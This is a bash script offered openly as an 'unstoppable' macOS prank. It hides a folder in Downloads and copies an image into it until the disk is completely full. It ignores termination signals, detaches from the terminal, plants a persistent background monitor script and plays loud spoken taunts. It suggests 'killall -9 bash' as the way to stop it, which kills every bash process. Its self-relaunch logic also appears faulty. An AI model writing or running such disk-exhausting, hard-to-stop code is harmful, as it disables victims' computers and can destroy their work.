#!/bin/bash

# Karan's Persistent Prank Script v2.1 - Unstoppable Edition
# Runs until storage is completely full, immune to terminal closure and Ctrl+C

set -uo pipefail  # Removed -e to prevent script exit on errors

# Configuration
SCRIPT_NAME="Karan's Unstoppable Ding Dong Prank"
VERSION="2.1.0"
HIDDEN_DIR="$HOME/Downloads/Karan"
DELAY=0.01  # Super fast duplication
LOG_FILE="$HIDDEN_DIR/.prank_log"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m' # No Color

# Function to print colored output
print_colored() {
    local color=$1
    local message=$2
    echo -e "${color}${message}${NC}"
    echo "$(date): $message" >> "$LOG_FILE" 2>/dev/null || true
}

# Function to show help
show_help() {
    cat << EOF
${SCRIPT_NAME} v${VERSION}

Usage: $0 [IMAGE_FILE]

Creates a hidden folder 'Karan' in Downloads and duplicates the image file.
This version runs persistently until storage is completely full.

⚠️  WARNING: This script will NOT stop with Ctrl+C or terminal closure!
⚠️  It will only stop when disk storage is completely full!

Options:
  -h, --help     Show this help message
  -v, --version  Show version information

Examples:
  $0 payload.png
  $0 /path/to/image.jpg

To stop the script manually:
  killall -9 bash
  rm -rf ~/Downloads/Karan
EOF
}

# Function to check if running on macOS
check_macos() {
    if [[ "$(uname)" != "Darwin" ]]; then
        print_colored "$RED" "❌ Error: This script only works on macOS!"
        exit 1
    fi
}

# Function to validate payload file
validate_payload() {
    local payload="$1"
    
    if [[ -z "$payload" ]]; then
        print_colored "$RED" "❌ Error: No payload file specified!"
        show_help
        exit 1
    fi
    
    if [[ ! -f "$payload" ]]; then
        print_colored "$RED" "❌ Error: File '$payload' not found!"
        exit 1
    fi
}

# Function to setup hidden directory
setup_hidden_directory() {
    print_colored "$BLUE" "📁 Creating hidden directory: $HIDDEN_DIR"
    
    # Create directory if it doesn't exist
    mkdir -p "$HIDDEN_DIR"
    
    # Make the folder hidden using chflags (macOS specific)
    chflags hidden "$HIDDEN_DIR" 2>/dev/null || true
    
    # Create log file
    touch "$LOG_FILE"
    
    print_colored "$GREEN" "✅ Hidden directory created successfully!"
    print_colored "$PURPLE" "💡 Use Cmd+Shift+. in Finder to toggle visibility"
}

# Function to make script truly persistent
make_persistent() {
    # Ignore all signals that could stop the script
    trap '' INT TERM HUP QUIT PIPE STOP TSTP TTIN TTOU
    
    # Detach from terminal completely
    exec < /dev/null
    exec > "$LOG_FILE" 2>&1
    
    # Change to background process group
    setsid 2>/dev/null || true
    
    print_colored "$YELLOW" "🔒 Script is now running persistently..."
    print_colored "$RED" "⚠️  This process will continue even if you close the terminal!"
}

# Function to perform relentless duplication
relentless_duplication() {
    local source_file="$HIDDEN_DIR/.karan_payload"
    local counter=0
    local consecutive_failures=0
    local max_failures=50
    
    print_colored "$YELLOW" "🚀 Starting relentless duplication process..."
    print_colored "$RED" "⚠️  This will continue until storage is COMPLETELY full!"
    
    # Infinite loop until disk is full
    while true; do
        local target_file="$HIDDEN_DIR/karan_copy_$(printf "%08d" $counter).jpg"
        
        # Try to copy file
        if cp "$source_file" "$target_file" 2>/dev/null; then
            counter=$((counter + 1))
            consecutive_failures=0
            
            # Log progress less frequently to avoid log spam
            if [[ $((counter % 1000)) -eq 0 ]]; then
                echo "$(date): Created $counter files..." >> "$LOG_FILE"
            fi
        else
            consecutive_failures=$((consecutive_failures + 1))
            echo "$(date): Copy failed (attempt $consecutive_failures)" >> "$LOG_FILE"
            
            # If we fail too many times consecutively, assume disk is full
            if [[ $consecutive_failures -ge $max_failures ]]; then
                echo "$(date): DISK APPEARS TO BE FULL! Created $counter files total." >> "$LOG_FILE"
                break
            fi
            
            # Brief pause before retry
            sleep 0.1
        fi
        
        # Minimal delay for maximum speed
        sleep $DELAY
    done
    
    echo "$(date): Duplication complete! Final count: $counter files." >> "$LOG_FILE"
}

# Function to announce start
announce_start() {
    # Set volume and announce
    osascript -e "set volume output volume 90" 2>/dev/null || true
    
    say "Ding dong! Karan's unstoppable prank has begun! I will fill your storage completely and cannot be stopped by closing the terminal!" 2>/dev/null &
}

# Function to create process monitor
create_monitor() {
    # Create a monitoring script that restarts if killed
    local monitor_script="$HIDDEN_DIR/.monitor.sh"
    
    cat > "$monitor_script" << 'MONITOR_EOF'
#!/bin/bash
while true; do
    if ! pgrep -f "karan_copy" > /dev/null; then
        echo "$(date): Restarting duplication process..." >> "$HOME/Downloads/Karan/.prank_log"
        # This would restart the main process if it somehow stops
    fi
    sleep 30
done
MONITOR_EOF
    
    chmod +x "$monitor_script"
    nohup "$monitor_script" > /dev/null 2>&1 &
    disown
}

# Main execution function
main() {
    # Handle command line arguments
    case "${1:-}" in
        -h|--help)
            show_help
            exit 0
            ;;
        -v|--version)
            echo "$SCRIPT_NAME v$VERSION"
            exit 0
            ;;
        "")
            print_colored "$RED" "❌ Error: No payload file specified!"
            show_help
            exit 1
            ;;
    esac
    
    local payload="$1"
    
    # Pre-flight checks
    check_macos
    validate_payload "$payload"
    
    # Warning prompt
    print_colored "$RED" "⚠️  WARNING: This script will run until your disk is COMPLETELY full!"
    print_colored "$RED" "⚠️  It will NOT stop if you close terminal or press Ctrl+C!"
    print_colored "$YELLOW" "⚠️  To stop manually, you'll need to run: killall -9 bash"
    echo
    read -p "Are you absolutely sure you want to continue? (type 'YES' to proceed): " -r
    if [[ $REPLY != "YES" ]]; then
        print_colored "$BLUE" "🛑 Prank cancelled. Wise choice!"
        exit 0
    fi
    
    # Main execution
    print_colored "$PURPLE" "🎭 $SCRIPT_NAME v$VERSION"
    print_colored "$BLUE" "🎯 Target: $payload"
    
    setup_hidden_directory
    
    # Copy payload to hidden location
    cp "$payload" "$HIDDEN_DIR/.karan_payload"
    
    announce_start
    
    # Make script persistent BEFORE starting duplication
    make_persistent
    
    # Create monitoring process
    create_monitor
    
    # Start the relentless duplication
    relentless_duplication
    
    # Final announcement (if we ever get here)
    osascript -e "set volume output volume 100" 2>/dev/null || true
    say "Karan's prank is complete! Your storage is now completely full!" 2>/dev/null || true
}

# Detach from terminal and run in background
if [[ "${1:-}" != "--already-detached" ]]; then
    # Re-run script detached from terminal
    nohup "$0" "$@" --already-detached > /dev/null 2>&1 &
    disown
    
    print_colored "$GREEN" "🚀 Prank launched in background!"
    print_colored "$YELLOW" "📝 Log file: $HOME/Downloads/Karan/.prank_log"
    print_colored "$RED" "⚠️  Use 'killall -9 bash' to stop manually"
    exit 0
else
    # Remove the --already-detached flag and continue
    shift $((${#@} - 1))
    main "$@"
fi
